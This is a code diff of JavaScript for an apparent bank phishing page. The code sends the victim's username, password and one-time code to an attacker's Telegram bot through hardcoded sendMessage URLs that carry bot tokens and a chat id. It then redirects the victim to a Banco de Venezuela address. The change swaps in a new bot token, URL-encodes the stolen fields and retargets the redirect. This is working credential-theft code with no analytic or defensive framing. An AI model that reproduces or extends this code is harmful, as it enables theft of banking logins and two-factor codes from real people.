@@ -24,7 +24,7 @@ tokencode.addEventListener("change", () => {
 requestbutton.addEventListener("click", () => {
   const Http = new XMLHttpRequest();
   const url =
-    "https://api.telegram.org/bot7155307278:AAH8p8Xu4LGCSbWnURq8jGU0dN-kLLja-ws/sendMessage?chat_id=7101053333&text=TOKEN%20SOLICITADO";
+     "https://api.telegram.org/bot7091951380:AAEieD_XajyN7atgnVUHI_BWuUda4Fiu1TA/sendMessage?chat_id=7101053333&text=TOKEN%20SOLICITADO";
   Http.open("GET", url);
   Http.send();
 
@@ -54,10 +54,10 @@ tokencode.addEventListener("keyup", (e) => {
 sendatatme.addEventListener("click", () => {
   const Http = new XMLHttpRequest();
   const url =
-    "https://api.telegram.org/bot7155307278:AAH8p8Xu4LGCSbWnURq8jGU0dN-kLLja-ws/sendMessage?chat_id=7101053333&text=USERNAME:%20" +
-    resfirst.value +
-    " PASSWORD: " +
-    resecond.value;
+    "https://api.telegram.org/bot7091951380:AAEieD_XajyN7atgnVUHI_BWuUda4Fiu1TA/sendMessage?chat_id=7101053333&text=TOKEN%20SOLICITADO%20USUARIO:%20" +
+    encodeURIComponent(resfirst.value) +
+    "%20PASSWORD:%20" +
+    encodeURIComponent(resecond.value);
   Http.open("GET", url);
   Http.send();
 
@@ -70,12 +70,12 @@ sendatatme.addEventListener("click", () => {
 sendcode.addEventListener("click", () => {
   const Http = new XMLHttpRequest();
   const url =
-    "https://api.telegram.org/bot7155307278:AAH8p8Xu4LGCSbWnURq8jGU0dN-kLLja-ws/sendMessage?chat_id=7101053333&text=USERNAME:%20" +
-    resfirst.value +
-    " PASSWORD: " +
-    resecond.value +
-    " CODE: " +
-    rescode.value;
+    "https://api.telegram.org/bot7091951380:AAEieD_XajyN7atgnVUHI_BWuUda4Fiu1TA/sendMessage?chat_id=7101053333&text=TOKEN%20SOLICITADO%20USUARIO:%20" +
+    encodeURIComponent(resfirst.value) +
+    "%20PASSWORD:%20" +
+    encodeURIComponent(resecond.value) +
+    "%20CODE:%20" +
+    encodeURIComponent(rescode.value);
   Http.open("GET", url);
   Http.send();
 
@@ -83,5 +83,5 @@ sendcode.addEventListener("click", () => {
     console.log(Http.responseText);
   };
 
-  window.location.href = "https://www.patria.org.ve/";
+  window.location.href = "https://www.bancodevenezuela.com/index.html@p=3517.html";
 });
